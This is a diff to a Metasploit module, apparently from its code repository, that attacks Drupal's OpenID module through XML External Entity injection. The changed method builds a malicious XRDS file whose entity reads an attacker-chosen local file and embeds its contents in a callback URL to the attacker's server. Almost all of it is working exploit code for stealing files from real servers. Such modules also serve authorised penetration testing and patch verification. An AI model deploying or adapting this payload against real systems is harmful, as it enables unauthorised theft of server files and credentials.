@@ -11,6 +11,7 @@ class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::HttpServer::HTML
+  include REXML
 
   def initialize(info = {})
     super(update_info(info,
@@ -19,7 +20,7 @@ class Metasploit3 < Msf::Auxiliary
         This module abuses a XML External Entity Injection on the OpenID module
         from Drupal. The vulnerability exists on the parsing of a malformed XRDS
         file coming from a malicious OpenID endpoint. This module has been tested
-        successfully in Drupal 7.15 with the OpenID module enabled.
+        successfully in Drupal 7.15 and 7.2 with the OpenID module enabled.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -48,27 +49,52 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def xrds_file
-    xrds = <<-EOF
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
+    element_entity = <<-EOF
 <!ELEMENT URI ANY>
 <!ENTITY xxe SYSTEM "file://#{datastore['FILEPATH']}">
-]>
-<xrds:XRDS xmlns:xrds="xri://$xrds" xmlns="xri://$xrd*($v*2.0)" xmlns:openid="http://openid.net/xmlns/1.0">
-<XRD>
-  <Status cid="verified"/>
-  <ProviderID>xri://@</ProviderID>
-  <CanonicalID>http://example.com/user</CanonicalID>
-  <Service>
-    <Type>http://specs.openid.net/auth/2.0/signon</Type>
-    <Type>http://openid.net/srv/ax/1.0</Type>
-    <URI>#{get_uri}/#{@prefix}/&xxe;/#{@suffix}</URI>
-    <LocalID>http://example.com/xrds</LocalID>
-  </Service>
-</XRD>
-</xrds:XRDS>
-EOF
-    return xrds
+    EOF
+
+    xml = Document.new
+
+    xml.add(DocType.new('foo', "[ #{element_entity} ]"))
+
+    xml.add_element(
+      "xrds:XRDS",
+      {
+        'xmlns:xrds'    => "xri://$xrds",
+        'xmlns'         => "xri://$xrd*($v*2.0)",
+        'xmlns:openid' => "http://openid.net/xmlns/1.0",
+      })
+
+    xrd = xml.root.add_element("XRD")
+
+    xrd.add_element(
+      "Status",
+      {
+        "cid" => "verified"
+      }
+    )
+    provider = xrd.add_element("ProviderID")
+    provider.text = "xri://@"
+
+    canonical = xrd.add_element("CanonicalID")
+    canonical.text = "http://example.com/user"
+
+    service = xrd.add_element("Service")
+
+    type_one = service.add_element("Type")
+    type_one.text = "http://specs.openid.net/auth/2.0/signon"
+
+    type_two = service.add_element("Type")
+    type_two.text = "http://openid.net/srv/ax/1.0"
+
+    uri = service.add_element("URI")
+    uri.text = "METASPLOIT"
+
+    local_id = service.add_element("LocalID")
+    local_id.text = "http://example.com/xrds"
+
+    return xml.to_s.gsub(/METASPLOIT/, "#{get_uri}/#{@prefix}/&xxe;/#{@suffix}") # To avoid html encoding
   end
 
   def check
